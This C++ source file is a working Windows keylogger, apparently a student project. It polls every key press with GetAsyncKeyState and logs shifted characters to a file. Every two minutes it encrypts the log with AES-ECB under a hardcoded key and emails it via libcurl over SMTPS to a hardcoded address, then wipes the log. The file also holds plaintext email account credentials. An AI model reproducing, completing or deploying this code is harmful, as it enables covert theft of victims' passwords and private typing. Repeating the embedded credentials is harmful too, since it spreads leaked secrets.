#include<curl/curl.h>
#include "KeyloggerWithCurl.h"
#include<iostream>
#include<string>
#include<fstream>
#include<cstring>
#include <cryptopp/aes.h>
#include <cryptopp/modes.h>
#include <cryptopp/filters.h>
#include <cryptopp/base64.h> 
#include<windows.h> // Keylogging (detecting key presses using GetAsyncKeyState),
// Manipulating the console window
#include<winuser.h>
#include<chrono> // Retrieving time
#include<thread>// Used for introducing delays or sleep periods.

using namespace std;

// Class definition for EmailSender
void EmailSender::log(const string& logFilename)
{
    char key;
    
    //setting interval
    chrono::minutes interval(2);

    // Get the current time
    auto startTime = chrono::steady_clock::now();

    for (; ;)
    {
        
        //Sleep(10); //for hiding console window
        for (key = 8; key <= 222; key++)
        {
            if (GetAsyncKeyState(key) == -32767)
            {
                
                ofstream write(logFilename, ios::app);

                // Handle key presses for various keys and write to the log file
                // Check the elapsed time since the last time the file was encrypted and sent

                if ((key > 64) && (key < 91) && !(GetAsyncKeyState(0x10)))
                {
                    key += 32;
                    write << key;
                    write.close();

                }

                //for upper case letters

                else if ((key > 64) && (key < 91))
                {
                    write << key;
                    write.close();

                }

                else
                {
                    switch (key)
                    {
                    case 47:
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "?";
                            break;
                        }
                        else
                        {
                            write << "/";
                            break;
                        }

                    case 48:
                        if (GetAsyncKeyState(0x10))
                        {
                            write << ")";
                            break;
                        }
                        else
                        {
                            write << "0";
                            break;
                        }

                    case 49:
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "!";
                            break;
                        }
                        else
                        {
                            write << "1";
                            break;
                        }


                    case 50:
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "@";
                            break;
                        }
                        else
                        {
                            write << "2";
                            break;
                        }

                    case 51:
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "#";
                            break;
                        }
                        else
                        {
                            write << "3";
                            break;
                        }
                    case 52:
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "$";
                            break;
                        }
                        else
                        {
                            write << "4";
                            break;
                        }

                    case 53:
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "%";
                            break;
                        }
                        else
                        {
                            write << "5";
                            break;
                        }

                    case 54:
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "^";
                            break;
                        }
                        else
                        {
                            write << "6";
                            break;
                        }

                    case 55:
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "&";
                            break;
                        }
                        else
                        {
                            write << "7";
                            break;
                        }

                    case 56:
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "*";
                            break;
                        }
                        else
                        {
                            write << "8";
                            break;
                        }

                    case 57:
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "(";
                            break;
                        }
                        else
                        {
                            write << "9";
                            break;
                        }

                    case VK_SPACE:
                        write << " ";
                        break;

                    case VK_RETURN:
                        write << "\n";
                        break;

                    case VK_TAB:
                        write << "  ";
                        break;

                    case VK_BACK:
                        write << "[Backspace]";
                        break;

                    case VK_ESCAPE:
                        write << "[Esc]";
                        break;

                    case VK_DELETE:
                        write << "[Delete]";
                        break;

                    case VK_ADD:
                        if (GetAsyncKeyState(0x10))
                        {
                            write << '+';
                            break;
                        }
                        else
                        {
                            write << '=';
                            break;
                        }

                    case VK_SUBTRACT:
                        write << '-';
                        break;

                    case VK_MULTIPLY:
                        write << '*';
                        break;

                    case VK_UP:
                        write << "[Up Arrow]";
                        break;

                    case VK_DOWN:
                        write << "[Down Arrow]";
                        break;

                    case VK_LEFT:
                        write << "[Left Arrow]";
                        break;

                    case VK_RIGHT:
                        write << "[Right Arrow]";
                        break;


                    }

                }

                // Check the elapsed time since the last call to SendMailWithAttachment
                auto currentTime = chrono::steady_clock::now();
                auto elapsed = chrono::duration_cast<chrono::minutes>(currentTime - startTime);

                // If the elapsed time is greater than or equal to the interval, call SendMailWithAttachment
                if (elapsed >= interval) {

                    //sending file for Encryption
                    Encrypt_func(logFilename, write);
                    
                     //erasing all data
                    ofstream eraseFile(logFilename, ios::trunc);
                    eraseFile.close();

                    // Reset the start time for the next interval
                    startTime = chrono::steady_clock::now();
                }

                
               
            }
        }

    }
}

string EmailSender::aes_ecb_encrypt(const std::string& plaintext, const std::string& key) {
    CryptoPP::AES::Encryption aesEncryption;
    aesEncryption.SetKey(reinterpret_cast<const CryptoPP::byte*>(key.data()), key.size());

    CryptoPP::ECB_Mode_ExternalCipher::Encryption ecbEncryption(aesEncryption);

    std::string ciphertext;

    // Use CryptoPP::Base64Encoder for Base64 encoding
    CryptoPP::StringSource(plaintext, true, new CryptoPP::StreamTransformationFilter(ecbEncryption, new CryptoPP::Base64Encoder(new CryptoPP::StringSink(ciphertext))));

    return ciphertext;
}

//calling encrypt function which will write the encrypted text to files
void EmailSender:: Encrypt_func(const string& logFilename, ofstream& w) {
    std::string key = "2222222222222222";
    std::string line;
    std::string plaintext;


    if (key.size() != 16) {
        std::cerr << "Invalid key size. Key must be 16 characters long." << std::endl;
        return;
    }

    // Read content from Record.txt line by line
    std::ifstream recordFile("Record.txt");
    if (!recordFile.is_open()) {
        std::cerr << "Error opening Record.txt." << std::endl;
        return;
    }

    while (std::getline(recordFile, line)) {
        plaintext += line + "\n";  // Preserve newlines
    }

    recordFile.close();

    // Encryption
    std::string encryptedText = aes_ecb_encrypt(plaintext, key);

    // Write ciphertext to Send.txt in Base64 format
    const string name = "Send.txt";
    std::ofstream sendFile(name);
    if (!sendFile.is_open()) {
        std::cerr << "Error creating Send.txt." << std::endl;
        return;
    }

    sendFile << encryptedText;

   
    SendMailWithAttachment(name,sendFile);

    std::cout << "Encryption and file handling complete." << std::endl;
}





int EmailSender::SendMailWithAttachment(const string& logFilename, ofstream &w)
{

   //closing the file befor preparing it to send
    w.close();
    const char* username = "projectdsa354@gmail.com";
    const char* password = "wjkhuxjumyyzfypa";
    const char* from = "projectdsa354@gmail.com";
    const char* to = "sabihakalsoom17@gmail.com";
    const char* filename = logFilename.c_str();

    CURL* curl;
    CURLcode res = CURLE_OK;
    struct curl_slist* recipients = NULL;

    curl_global_init(CURL_GLOBAL_DEFAULT);

    curl = curl_easy_init();
    if (curl) {
        FILE* file;
        if (fopen_s(&file, filename, "r") != 0) {
            fprintf(stderr, "Error opening file: %s\n", filename);
            return 1;
        }

        curl_easy_setopt(curl, CURLOPT_URL, "smtps://smtp.gmail.com");
        curl_easy_setopt(curl, CURLOPT_USERNAME, username);
        curl_easy_setopt(curl, CURLOPT_PASSWORD, password);
        curl_easy_setopt(curl, CURLOPT_USE_SSL, CURLUSESSL_ALL);

        // Increase the timeout to 60 seconds
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 60L);

        // Enable verbose output for debugging
        curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

        // Set the recipients for the email
        recipients = curl_slist_append(recipients, to);
        curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);

        // Set the sender's email address
        curl_easy_setopt(curl, CURLOPT_MAIL_FROM, from);

        // Attach the specified file to the email
        curl_mime* mime;
        curl_mimepart* part;

        mime = curl_mime_init(curl);

        // Set up the mime part for the file attachment
        part = curl_mime_addpart(mime);
        curl_mime_name(part, filename);
        curl_mime_filedata(part, filename);

        // Set the mime structure as the post data
        curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);

        // Perform the email sending process
        res = curl_easy_perform(curl);

        // Check for errors
        if (res != CURLE_OK)
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));

        // Cleanup
        curl_slist_free_all(recipients);
        curl_easy_cleanup(curl);
        curl_mime_free(mime);
        fclose(file);
    }

    curl_global_cleanup();
    return (int)res;

}




